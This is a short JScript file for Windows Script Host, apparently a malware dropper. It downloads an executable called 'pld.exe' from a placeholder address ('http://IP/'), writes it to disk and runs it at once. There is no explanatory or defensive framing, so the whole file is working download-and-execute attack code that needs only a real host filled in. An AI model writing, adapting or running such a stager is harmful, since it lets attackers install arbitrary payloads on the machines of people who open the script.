var url = "http://IP/pld.exe"
var obj = WScript.CreateObject('MSXML2.XMLHTTP');

obj.Open('GET', url, false);
obj.Send();

if(obj.Status == 200){
	var strm = WScript.CreateObject('ADODB.Stream');
	strm.Open();
	strm.Type = 1;
	strm.Write(obj.ResponseBody);
	strm.Position = 0;
	
	strm.SaveToFile("pld.exe", 2);
	strm.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("pld.exe");
